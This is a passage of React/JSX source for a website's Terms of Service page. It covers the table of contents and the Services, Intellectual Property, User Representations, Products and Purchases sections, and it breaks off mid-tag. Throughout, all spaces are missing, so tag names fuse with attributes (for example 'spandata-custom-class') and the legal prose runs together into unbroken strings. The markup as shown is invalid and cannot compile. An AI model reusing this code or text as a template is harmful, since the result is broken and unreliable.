ontSize:15}}><spandata-custom-class='body_text'>1.OURSERVICES</span></span></span></a></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#ip'><spanstyle={{color:'rgb(0,58,250)'}}><spandata-custom-class='body_text'>2.INTELLECTUALPROPERTYRIGHTS</span></span></a></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#userreps'/><adata-custom-class='link'href='#userreps'><spanstyle={{color:'rbg(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>3.USERREPRESENTATIONS</span></span></a></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span>{''}<adata-custom-class='link'href='#products'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#products'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/>4.PRODUCTS<bdtclassName='statement-end-if-in-editor'/><bdtclassName='statement-end-if-in-editor'/></span></span></a>{''}<adata-custom-class='link'href='#purchases'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#purchases'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>5.PURCHASESANDPAYMENT<bdtclassName='statement-end-if-in-editor'/></span></span></a>{''}<bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/></span></span><adata-custom-class='link'href='#returnno'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>6.<bdtclassName='block-component'/>RETURN<bdtclassName='statement-end-if-in-editor'/>POLICY</span></span></a><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='statement-end-if-in-editor'/><bdtclassName='statement-end-if-in-editor'/></span></span>{''}<adata-custom-class='link'href='#software'/>{''}<adata-custom-class='link'href='#software'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#software'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#prohibited'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#prohibited'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>7.PROHIBITEDACTIVITIES</span></span></a>{''}<adata-custom-class='link'href='#ugc'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#ugc'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>8.USERGENERATEDCONTRIBUTIONS</span></span></a>{''}<adata-custom-class='link'href='#license'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#license'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>9.CONTRIBUTION<bdtclassName='block-component'/>LICENSE<bdtclassName='statement-end-if-in-editor'/></span></span></a>{''}<adata-custom-class='link'href='#reviews'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#reviews'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#mobile'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#mobile'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#socialmedia'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#socialmedia'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#thirdparty'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#thirdparty'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#advertisers'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#advertisers'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#sitemanage'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#sitemanage'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>10.SERVICESMANAGEMENT</span></span></a>{''}<adata-custom-class='link'href='#ppyes'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#ppyes'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#ppno'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#ppno'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/></span></span></a>{''}<adata-custom-class='link'href='#dmca'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#dmca'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='statement-end-if-in-editor'/></span></span></a></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/><bdtclassName='block-component'/><bdtclassName='block-component'/></span></span>{''}<adata-custom-class='link'href='#terms'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#terms'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>11.TERMANDTERMINATION</span></span></a>{''}<adata-custom-class='link'href='#modifications'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#modifications'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>12.MODIFICATIONSANDINTERRUPTIONS</span></span></a>{''}<adata-custom-class='link'href='#law'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#law'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>13.GOVERNINGLAW</span></span></a>{''}<adata-custom-class='link'href='#disputes'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#disputes'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>14.DISPUTERESOLUTION</span></span></a>{''}<adata-custom-class='link'href='#corrections'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#corrections'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>15.CORRECTIONS</span></span></a>{''}<adata-custom-class='link'href='#disclaimer'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#disclaimer'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>16.DISCLAIMER</span></span></a>{''}<adata-custom-class='link'href='#liability'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#liability'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>17.LIMITATIONSOFLIABILITY</span></span></a>{''}<adata-custom-class='link'href='#indemnification'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#indemnification'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>18.INDEMNIFICATION</span></span></a>{''}<adata-custom-class='link'href='#userdata'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#userdata'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>19.USERDATA</span></span></a>{''}<adata-custom-class='link'href='#electronic'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#electronic'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>20.ELECTRONICCOMMUNICATIONS,TRANSACTIONS,ANDSIGNATURES</span></span></a>{''}<adata-custom-class='link'href='#california'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#california'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'><bdtclassName='block-component'/>21.CALIFORNIAUSERSANDRESIDENTS<bdtclassName='statement-end-if-in-editor'/></span></span></a>{''}<adata-custom-class='link'href='#misc'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#misc'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>22.MISCELLANEOUS</span></span></a>{''}<adata-custom-class='link'href='#contact'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><adata-custom-class='link'href='#contact'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}><spandata-custom-class='body_text'>23.CONTACTUS</span></span></a></div></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='heading_1'style={{lineHeight:'1.5'}}><aname='_b6y29mp52qvx'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='services'style={{lineHeight:'1.5'}}><strong><spanstyle={{fontSize:19}}>1.OURSERVICES</span></strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>TheinformationprovidedwhenusingtheServicesisnotintendedfordistributiontoorusebyanypersonorentityinanyjurisdictionorcountrywheresuchdistributionorusewouldbecontrarytolaworregulationorwhichwouldsubjectustoanyregistrationrequirementwithinsuchjurisdictionorcountry.Accordingly,thosepersonswhochoosetoaccesstheServicesfromotherlocationsdosoontheirowninitiativeandaresolelyresponsibleforcompliancewithlocallaws,ifandtotheextentlocallawsareapplicable.<bdtclassName='block-component'/></span><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><bdtclassName='statement-end-if-in-editor'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div></div><divalign='center'data-custom-class='heading_1'style={{textAlign:'left',lineHeight:'1.5'}}><strong><spanid='ip'style={{fontSize:19}}>2.INTELLECTUALPROPERTYRIGHTS</span></strong></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5'}}><strong>Ourintellectualproperty</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>WearetheownerorthelicenseeofallintellectualpropertyrightsinourServices,includingallsourcecode,databases,functionality,software,websitedesigns,audio,video,text,photographs,andgraphicsintheServices(collectively,the{''}<bdtclassName='block-component'/>&quot;Content&quot;<bdtclassName='statement-end-if-in-editor'/>),aswellasthetrademarks,servicemarks,andlogoscontainedtherein(the{''}<bdtclassName='block-component'/>&quot;Marks&quot;<bdtclassName='statement-end-if-in-editor'/>).</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>OurContentandMarksareprotectedbycopyrightandtrademarklaws(andvariousotherintellectualpropertyrightsandunfaircompetitionlaws)andtreatiesintheUnitedStatesandaroundtheworld.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>TheContentandMarksareprovidedinorthroughtheServices{''}<bdtclassName='block-component'/>&quot;ASIS&quot;<bdtclassName='statement-end-if-in-editor'/>foryour{''}<bdtclassName='block-component'/>personal,non-commercialuseorinternalbusinesspurpose<bdtclassName='statement-end-if-in-editor'/>only.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5'}}><strong>YouruseofourServices</strong></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>SubjecttoyourcompliancewiththeseLegalTerms,includingthe{''}<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span><adata-custom-class='link'href='#prohibited'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}>PROHIBITEDACTIVITIES</span></a><spanstyle={{fontSize:15}}><bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/>sectionbelow,wegrantyouanon-exclusive,non-transferable,revocable<bdtclassName='block-component'/>license<bdtclassName='statement-end-if-in-editor'/>to:</span></div><ul><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>accesstheServices;and</span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>downloadorprintacopyofanyportionoftheContenttowhichyouhaveproperlygainedaccess.</span></li></ul><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>solelyforyour<bdtclassName='block-component'/>personal,non-commercialuseorinternalbusinesspurpose<bdtclassName='statement-end-if-in-editor'/>.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>ExceptassetoutinthissectionorelsewhereinourLegalTerms,nopartoftheServicesandnoContentorMarksmaybecopied,reproduced,aggregated,republished,uploaded,posted,publiclydisplayed,encoded,translated,transmitted,distributed,sold,licensed,orotherwiseexploitedforanycommercialpurposewhatsoever,withoutourexpresspriorwrittenpermission.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>IfyouwishtomakeanyuseoftheServices,Content,orMarksotherthanassetoutinthissectionorelsewhereinourLegalTerms,pleaseaddressyourrequestto:{''}<bdtclassName='question'>nathandai2000@gmail.com</bdt>.Ifweevergrantyouthepermissiontopost,reproduce,orpubliclydisplayanypartofourServicesorContent,youmustidentifyusastheownersorlicensorsoftheServices,Content,orMarksandensurethatanycopyrightorproprietarynoticeappearsorisvisibleonposting,reproducing,ordisplayingourContent.</span></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>WereserveallrightsnotexpresslygrantedtoyouinandtotheServices,Content,andMarks.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>AnybreachoftheseIntellectualPropertyRightswillconstituteamaterialbreachofourLegalTermsandyourrighttouseourServiceswillterminateimmediately.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_2'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><strong>Yoursubmissions<bdtclassName='block-component'/></strong></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>Pleasereviewthissectionandthe<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/><adata-custom-class='link'href='#prohibited'><spanstyle={{color:'rgb(0,58,250)'}}>PROHIBITEDACTIVITIES</span></a><bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/>sectioncarefullypriortousingourServicestounderstandthe(a)rightsyougiveusand(b)obligationsyouhavewhenyoupostoruploadanycontentthroughtheServices.</span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><strong>Submissions:</strong>Bydirectlysendingusanyquestion,comment,suggestion,idea,feedback,orotherinformationabouttheServices(<bdtclassName='block-component'/>&quot;Submissions&quot;<bdtclassName='statement-end-if-in-editor'/>),youagreetoassigntousallintellectualpropertyrightsinsuchSubmission.YouagreethatweshallownthisSubmissionandbeentitledtoitsunrestricteduseanddisseminationforanylawfulpurpose,commercialorotherwise,withoutacknowledgmentorcompensationtoyou.<bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}><strong>Youareresponsibleforwhatyoupostorupload:</strong>BysendingusSubmissions<bdtclassName='block-component'/>throughanypartoftheServices<bdtclassName='block-component'/>you:</span></div><ul><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>confirmthatyouhavereadandagreewithour<bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/></span><adata-custom-class='link'href='#prohibited'><spanstyle={{color:'rgb(0,58,250)',fontSize:15}}>PROHIBITEDACTIVITIES</span></a><spanstyle={{fontSize:15}}><bdtclassName='block-component'/>&quot;<bdtclassName='statement-end-if-in-editor'/>andwillnotpost,send,publish,upload,ortransmitthroughtheServicesanySubmission<bdtclassName='block-component'/>thatisillegal,harassing,hateful,harmful,defamatory,obscene,bullying,abusive,discriminatory,threateningtoanypersonorgroup,sexuallyexplicit,false,inaccurate,deceitful,ormisleading;</span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>totheextentpermissiblebyapplicablelaw,waiveanyandallmoralrightstoanysuchSubmission<bdtclassName='block-component'/>;</span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>warrantthatanysuchSubmission<bdtclassName='block-component'/>areoriginaltoyouorthatyouhavethenecessaryrightsand<bdtclassName='block-component'/>licenses<bdtclassName='statement-end-if-in-editor'/>tosubmitsuchSubmissions<bdtclassName='block-component'/>andthatyouhavefullauthoritytograntustheabove-mentionedrightsinrelationtoyourSubmissions<bdtclassName='block-component'/>;and</span></li><liclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:15}}>warrantandrepresentthatyourSubmissions<bdtclassName='block-component'/>donotconstituteconfidentialinformation.</span></li></ul><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}>YouaresolelyresponsibleforyourSubmissions<bdtclassName='block-component'/>andyouexpresslyagreetoreimburseusforanyandalllossesthatwemaysufferbecauseofyourbreachof(a)thissection,(b)anythirdparty’sintellectualpropertyrights,or(c)applicablelaw.<bdtclassName='block-component'/><bdtclassName='block-component'/></div><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><br/></div></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='heading_1'id='userreps'style={{lineHeight:'1.5'}}><aname='_5hg7kgyv9l8z'/><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>3.</span></strong></span>&nbsp;</strong></span></strong>USERREPRESENTATIONS</span></strong></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>ByusingtheServices,yourepresentandwarrantthat:</span><bdtclassName='block-containerif'data-type='if'id='d2d82ca8-275f-3f86-8149-8a5ef8054af6'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_account_option'data-type='statement'/>&nbsp;</bdt><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>(</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}>1</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>)youhavethelegalcapacityandyouagreetocomplywiththeseLegalTerms;</span><bdtclassName='block-containerif'data-type='if'id='8d4c883b-bc2c-f0b4-da3e-6d0ee51aca13'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_u13_option'data-type='statement'/>&nbsp;</bdt><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>(</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}>2</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>)youarenotaminorinthejurisdictioninwhichyoureside<bdtclassName='block-containerif'data-type='if'id='76948fab-ec9e-266a-bb91-948929c050c9'><bdtdata-type='conditional-block'><bdtclassName='block-component'data-record-question-key='user_o18_option'data-type='statement'/></bdt>;(</bdt></span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}>3</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>)youwillnotaccesstheServicesthroughautomatedornon-humanmeans,whetherthroughabot,scriptorotherwise;(</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}>4</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>)youwillnotusetheServicesforanyillegalor{''}<bdtclassName='block-component'/>unauthorized<bdtclassName='statement-end-if-in-editor'/>purpose;and(</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}>5</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'11pt'}}>)youruseoftheServiceswillnotviolateanyapplicablelaworregulation.</span><spanstyle={{color:'rgb(89,89,89)',fontSize:'14.6667px'}}/></bdt></bdt></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:'115%'}}><divclassName='MsoNormal'style={{lineHeight:'17.25px'}}><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:'11pt',lineHeight:'16.8667px',color:'rgb(89,89,89)',}}>Ifyouprovideanyinformationthatisuntrue,inaccurate,notcurrent,orincomplete,wehavetherighttosuspendorterminateyouraccountandrefuseanyandallcurrentorfutureuseoftheServices(oranyportionthereof).</span></div><divclassName='MsoNormal'style={{lineHeight:'1.1',textAlign:'left'}}><bdtclassName='block-component'/></div></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><spanstyle={{fontSize:15}}><bdtclassName='block-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='heading_1'id='products'style={{lineHeight:'1.5',textAlign:'left'}}><spanstyle={{fontSize:19}}><strong>4.PRODUCTS</strong></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt><spanstyle={{fontSize:15}}>Wemakeeveryefforttodisplayasaccuratelyaspossiblethe{''}<bdtclassName='block-component'/>colors<bdtclassName='statement-end-if-in-editor'/>,features,specifications,anddetailsoftheproductsavailableontheServices.However,wedonotguaranteethatthe<bdtclassName='block-component'/>colors<bdtclassName='statement-end-if-in-editor'/>,features,specifications,anddetailsoftheproductswillbeaccurate,complete,reliable,current,orfreeofothererrors,andyourelectronicdisplaymaynotaccuratelyreflecttheactual{''}<bdtclassName='block-component'/>colors<bdtclassName='statement-end-if-in-editor'/>anddetailsoftheproducts.{''}<bdtclassName='statement-end-if-in-editor'/>Allproductsaresubjecttoavailability<bdtclassName='block-component'/>,andwecannotguaranteethatitemswillbeinstock<bdtclassName='statement-end-if-in-editor'/>.Wereservetherighttodiscontinueanyproductsatanytimeforanyreason.Pricesforallproductsaresubjecttochange.<bdtclassName='statement-end-if-in-editor'/><bdtclassName='statement-end-if-in-editor'/></span></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt></div><divclassName='MsoNormal'style={{lineHeight:'1.5',textAlign:'left'}}><br/></div></div></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'data-custom-class='heading_1'id='purchases'style={{lineHeight:'1.5'}}><aname='_ynub0jdx8pob'/><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}><strong><spanstyle={{lineHeight:'115%',fontFamily:'Arial',fontSize:19,}}>5.</span></strong></span></strong></span>&nbsp;</strong>PURCHASESANDPAYMENT</span></strong></div></div><divalign='center'style={{lineHeight:'1.5'}}><br/></div><divalign='center'style={{textAlign:'left'}}><divclassName='MsoNormal'style={{lineHeight:'1.5'}}><bdtclassName='block-component'><spanstyle={{fontSize:15}}/></bdt></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5'}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}>Weacceptthefollowingformsofpayment:</span></div><divclassName='MsoNormal'style={{textAlign:'justify',lineHeight:'115%'}}><divclassName='MsoNormal'style={{textAlign:'left',lineHeight:1}}><br/></div></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',marginLeft:20}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><bdtclassName='forloop-component'/>-&nbsp;<bdtclassName='question'>Visa</bdt></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',marginLeft:20}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><bdtclassName='forloop-component'/>-&nbsp;<bdtclassName='question'>Mastercard</bdt></span></div><divclassName='MsoNormal'data-custom-class='body_text'style={{lineHeight:'1.5',marginLeft:20}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoThemecolor:'text1',msoThemetint:166,}}><bdtclassName='forloop-component'/></span></div><divclassName='MsoNormal'style={{lineHeight:1}}><spanstyle={{fontSize:'11.0pt',lineHeight:'115%',fontFamily:'Arial',color:'#595959',msoTheme